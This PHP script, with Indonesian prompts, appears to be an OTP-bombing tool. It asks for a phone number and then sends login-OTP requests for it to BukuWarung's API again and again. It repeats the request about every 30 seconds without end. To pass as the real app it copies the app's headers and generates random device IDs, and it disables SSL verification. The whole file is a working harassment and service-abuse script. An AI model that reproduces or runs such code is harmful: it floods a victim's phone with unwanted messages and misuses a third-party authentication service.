<?php
echo ("Masukkan nomor : ");
$number		= trim(fgets(STDIN));

echo "Mengirim pesan ke => $number\n";

eksekusi($number);

function eksekusi($number){
    $datauser = array(
            "phone"                 => $number,
            "action"                => "LOGIN_OTP",
            "countryCode"           => "62",
            "deviceId"              => gen_uuid(),
            "method"                => "WA",
          );

    $cekdata    = get_web_page("https://api.bukuwarung.com/api/v1/auth/otp/send", $datauser); //cek kelas
    //print_r($cekdata);
    //print_r($cekdata["content"]);
    $dt = json_decode($cekdata["content"]);
    if (isset($dt->recipient)) {
        $msg = "$dt->message => $dt->recipient => delay 30 sec.\n";
    } else {
        $msg = "$dt->message => delay 30 sec.\n";
    }
    
    echo "$msg";
    echo 'Sleep => 30';
    sleep(5);
    echo " | 25 ";
    sleep(5);
    echo " | 20 ";
    sleep(5);
    echo " | 15 ";
    sleep(5);
    echo " | 10 ";
    sleep(5);
    echo " | 5 ";
    sleep(5);
    echo " | 0 \n";
    echo "Eksekusi kembali nomor => $number\n";
    eksekusi($number);
}




function get_web_page( $url, $fields )
{   
    
    $heads[] = "Accept: application/json";
    $heads[] = "X-APP-VERSION-NAME: 3.7.1";
    $heads[] = "X-APP-VERSION-CODE: 3739";
    $heads[] = "X-TIMEZONE: Asia/Jakarta";
    $heads[] = "Content-Type: application/json; charset\u003dUTF-8";
    //$heads[] = "Content-Length: 127";
    $heads[] = "Host: api.bukuwarung.com";
    $heads[] = "Connection: Keep-Alive";
    $heads[] = "Accept-Encoding: gzip";
    $heads[] = "User-Agent: okhttp/4.8.1";

    $field_string = json_encode($fields);

    $options = array(
        CURLOPT_RETURNTRANSFER => true,     // return web page
        CURLOPT_HEADER         => false,    // don't return headers
        CURLOPT_FOLLOWLOCATION => true,     // follow redirects
        CURLOPT_ENCODING       => "",       // handle all encodings
        CURLOPT_USERAGENT      => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36", // who am i
        CURLOPT_AUTOREFERER    => true,     // set referer on redirect
        CURLOPT_CONNECTTIMEOUT => 120,      // timeout on connect
        CURLOPT_TIMEOUT        => 120,      // timeout on response
        CURLOPT_MAXREDIRS      => 10,       // stop after 10 redirects
        CURLOPT_HTTPHEADER     => $heads,       // stop after 10 redirects
        CURLOPT_POSTFIELDS     => $field_string,       // stop after 10 redirects
        CURLOPT_SSL_VERIFYPEER => false     // Disabled SSL Cert checks
    );

    $ch      = curl_init( $url );
    curl_setopt_array( $ch, $options );
    $content = curl_exec( $ch );
    $err     = curl_errno( $ch );
    $errmsg  = curl_error( $ch );
    $header  = curl_getinfo( $ch );
    curl_close( $ch );

    $header['errno']   = $err;
    $header['errmsg']  = $errmsg;
    $header['content'] = $content;
    return $header;
}

function gen_uuid() {
    return sprintf( '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ),
        mt_rand( 0, 0xffff ),
        mt_rand( 0, 0x0fff ) | 0x4000,
        mt_rand( 0, 0x3fff ) | 0x8000,
        mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )
    );
}
?>
